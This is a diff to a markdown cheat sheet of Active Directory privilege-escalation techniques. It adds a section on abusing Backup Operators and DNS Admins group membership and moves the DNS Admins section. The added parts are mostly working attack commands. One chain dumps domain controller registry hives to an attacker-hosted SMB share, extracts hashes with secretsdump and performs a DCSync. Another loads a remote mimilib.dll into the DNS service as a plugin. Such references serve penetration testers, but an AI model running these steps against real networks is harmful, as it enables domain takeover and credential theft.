@@ -6,6 +6,10 @@
 * [Kerberoast](#Kerberoast) 
   * [Set SPN](#Set-SPN)
 * [AS-REP Roasting](#AS-REP-Roasting)
+* [High Privileged Groups](#High-Privileged-Groups)
+  * [Backup Operators](#Backup-Operators)
+  * [Account Operators](#Account-Operators)
+  * [DNS Admins](#DNS-Admins)
 * [Access Control List(ACL)](#Access-Control-List)
   * [Check specific ACL permissions](#Specific-ACL-permissions)
   * [ACL-abuses](#ACL-abuses)
@@ -35,7 +39,6 @@
   * [MS Exchange escalating privileges](#MS-Exchange-escalating-privileges)
   * [NTLM Relay MS Exchange abuse](#NTLM-Relay-MS-Exchange-abuse)
 * [Local Administrator Password Solution(LAPS)](#LAPS)
-* [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
   * [Locating and accessing SQL Servers](#Locating-and-accessing-SQL-Servers)
   * [Initial foothold](#Initial-foothold)
@@ -259,6 +262,61 @@ Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectD
 ```
 . ./PowerView_dev.ps1
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+## High Privileged Groups
+### Backup Operators
+- Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. 
+- Backup Operators also can log on to and shut down the computer. 
+- They also have the permissions needed to replace files (including operating system files) on domain controllers.
+
+#### Get members of the backup operators group
+```
+Get-DomainGroupMember "Backup Operators" | Select-Object Membername
+```
+
+#### Host a public SMB share
+```
+python3 /opt/impacket/examples/smbserver.py share <DIRECTORY FOR SHARE> -smb2support
+```
+
+#### Retrieve SAM, SYSTEM, and SECURITY HIVE
+- Run it as the "Backup Operator" user
+- https://github.com/mpgn/BackupOperatorToDA
+```
+.\BackupOperatorToDA.exe -t \\<DC FQDN> -u <USER> -p <PASSWORD> -d <DOMAIN> -o \\<IP>\<SHARE>\
+```
+
+#### Run secretsdump.py to extract machine account hash
+```
+secretsdump.py LOCAL -system <DIRECTORY FOR SHARE>/SYSTEM -security <DIRECTORY FOR SHARE>/SECURITY -sam <DIRECTORY FOR SHARE>/SAM
+````
+
+#### Run DCSync with the computer account hash
+```
+secretsdump.py '<DOMAIN>/<DC COMPUTERACCONT NAME>$'@<DC FQDN> -hashes <LM HASH>:<NTLM HASH>
+```
+
+### Account Operators
+
+
+### DNS Admins
+#### Enumerate member of the DNS admin group
+```
+Get-NetGRoupMember “DNSAdmins”
+```
+
+#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
+Share the directory the ddl is in for everyone so its accessible.
+logs all DNS queries on C:\Windows\System32\kiwidns.log 
+```
+Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
+```
+
+#### Restart DNS
+```
+Sc \\<dns server> stop dns
+Sc \\<dns server> start dns
 ```
 
 ## Access Control List
@@ -1245,25 +1303,6 @@ Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samacc
 
 #LAPS Powershell cmdlet
 Get-AdmPwdPassword -ComputerName <MACHINE NAME>
-```
-
-## DNS Admins
-#### Enumerate member of the DNS admin group
-```
-Get-NetGRoupMember “DNSAdmins”
-```
-
-#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
-Share the directory the ddl is in for everyone so its accessible.
-logs all DNS queries on C:\Windows\System32\kiwidns.log 
-```
-Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
-```
-
-#### Restart DNS
-```
-Sc \\<dns server> stop dns
-Sc \\<dns server> start dns
 ```
 
 ## Attacking WSUS
